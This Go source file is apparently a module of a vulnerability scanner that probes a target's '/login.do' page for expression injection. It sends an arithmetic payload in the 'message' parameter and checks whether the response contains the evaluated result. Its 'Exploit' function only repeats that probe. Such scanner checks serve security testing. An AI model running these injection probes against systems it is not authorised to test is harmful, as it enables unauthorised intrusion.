package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wm02 struct {
}

func (s *Wm02) Scan(targetUrl string) {
	vulnerable, err := Wm02scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wm02] 存在Login.do 表达式注入")
	} else {
		color.White("[Wm02] 不存在Login.do 表达式注入")
	}
}

func (*Wm02) Exploit(targetUrl string) {
	runResult, err := Wm02runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wm02scancore(targetUrl string) (bool, error) {
	url := "/login.do?message=66*66*66-66666"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "220830") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wm02runcore(targetUrl string) (string, error) {
	url := "/login.do?message=66*66*66-66666"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "220830") {
		return "存在Login.do 表达式注入", nil
	} else {
		return "", nil
	}
}
